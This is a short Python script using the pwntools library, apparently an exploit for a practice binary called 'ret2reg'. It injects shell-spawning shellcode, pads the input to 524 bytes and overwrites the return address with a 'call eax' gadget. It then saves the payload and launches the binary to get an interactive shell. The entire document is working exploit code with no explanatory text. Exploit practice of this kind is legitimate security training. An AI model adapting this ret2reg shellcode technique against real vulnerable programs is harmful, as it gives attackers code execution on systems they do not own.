from pwn import *

elf = ELF("./bin/ret2reg")
_call_eax = 0x08049019
shellcode = asm(shellcraft.sh())

payload = flat(shellcode, b"a" * (524 - len(shellcode)), _call_eax)
print(len(payload))
f = open("payload", "wb")
f.write(payload)
f.close()

sh = elf.process([payload])
sh.interactive()
